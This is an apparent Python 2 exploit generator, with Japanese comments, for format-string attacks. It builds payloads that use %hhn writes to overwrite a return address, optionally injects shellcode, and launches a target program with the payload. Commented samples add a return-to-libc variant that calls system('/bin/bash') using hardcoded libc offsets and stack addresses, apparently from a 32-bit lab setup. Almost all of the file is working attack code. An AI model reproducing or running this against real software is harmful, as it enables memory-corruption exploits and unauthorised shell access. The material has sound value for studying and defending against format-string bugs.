# coding:utf-8
import sys
import struct
from subprocess import Popen
import argparse
import binascii
from subprocess import Popen, PIPE
import re

def changeShellcode(shellcode):
	byteCode=shellcode.split("\\x")
	del byteCode[0]
	buf=bytes()
	for code in byteCode:
		byte=int(code,16)
		buf+=struct.pack('<B', byte)
	return buf

class FormatStringAttack:
	"""Format String Attack class""" 
	def __init__(self, stack_num, rewrite_addr, *execute_des_addr):
		self.rewrite_addr=rewrite_addr
		self.execute_des_addr=execute_des_addr
		self.stack_num=stack_num

	def execute(self,shellcode="None"):
		index=self.stack_num
		buf=str()
		buf_size=0
		offset=list(self.execute_des_addr)

		for i in range(0,len(offset)*4):
			if offset[i/4] != "NULL":
				buf += struct.pack('<I', self.rewrite_addr+i)

		if shellcode != None:
			buf_size=16
			buf+=changeShellcode(shellcode[0])

		all_num=0
		buf=str(buf)
		buf_cul=[]
		offset=filter(lambda n:type(n)!=str, offset)
		for i in range(0,len(offset)):
			a=map(ord, struct.pack('<I',offset[i]+buf_size))
			for j in range(0,4):
				a[j] = ((a[j]-all_num-len(buf)) % 0x100)
				buf_cul.append(a[j])
				all_num+=a[j]
		for i,addr in enumerate(buf_cul): buf += "%%%dc%%%d$hhn" % (addr, index+i)

		print("\n[*] ShellCode")
		if shellcode == None:
			buf_str=str([buf])
			for i,m in enumerate(re.finditer('\$.',buf_str)):
				buf_str=buf_str[:m.start()+i] + "\\"+buf_str[m.start()+i:]
			print(buf_str+"\n")
		else:print(buf+"\n")
		return buf


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='Format String Attack')
	parser.add_argument('arg1', type=str, help='書き換えたいアドレス先')
	parser.add_argument('arg2', type=str, help='シェルが格納されるアドレス　or　実行したい先のアドレス')
	parser.add_argument('arg3', type=str, help='スタック番号')

	parser.add_argument('-s', '--shellcode', nargs=1,help='<Shellcode>')
	parser.add_argument('-e', '--excute',nargs=1, type=str, help='実行するファイル')
	args = parser.parse_args()


	return_addr=int("0xd8",16)+int("0xbfffefc4", 16) #書き換えたい、returnまでのアドレス
	buf_addr=int("0xbfffefc4", 16) #実行したい先のアドレス

	format=FormatStringAttack(5,return_addr,buf_addr)
	buf = format.execute(args.shellcode) #shellcodeを挿入する

	if args.excute != None:
		p = Popen([args.excute[0], buf])
		p.wait()


	""" 1: sample
		[*]C: system("/bin/bash");
		[*]stack images: | system | return | first arg |

		system_offset=0x00040310 	# nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
		bin_bash_offset=0x162cec	# strings -tx /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'

		libc_base = int("0xb7e16000", 16)

		sys_addr=libc_base+system_offset
		bin_bash_addr=libc_base+bin_bash_offset

		format=FormatStringAttack(5,return_addr,sys_addr,"NULL",bin_bash_offset)
		buf = format.execute(args.shellcode) #shellcodeなしでおk！　-sを付けなければ良い

	"""

	""" 2: sample
		return_addr=int("0xd8",16)+int("0xbfffefc4", 16) #書き換えたい、returnまでのアドレス
		buf_addr=int("0xbfffefc4", 16) #実行したい先のアドレス

		format=FormatStringAttack(5,return_addr,buf_addr)
		buf = format.execute(args.shellcode) #shellcodeを挿入する

	"""






